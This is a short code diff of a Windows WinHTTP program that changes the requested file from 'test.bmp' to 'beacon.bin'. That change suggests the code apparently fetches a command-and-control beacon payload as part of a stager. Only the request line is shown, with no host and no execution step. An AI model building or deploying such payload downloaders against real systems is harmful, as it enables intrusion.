@@ -42,7 +42,7 @@ int main() {
 
 	// Create an HTTP request handle.
 	if (hConnect)
-		hRequest = WinHttpOpenRequest(hConnect, L"GET", L"test.bmp",
+		hRequest = WinHttpOpenRequest(hConnect, L"GET", L"beacon.bin",
 			NULL, WINHTTP_NO_REFERER,
 			WINHTTP_DEFAULT_ACCEPT_TYPES,
 			0);
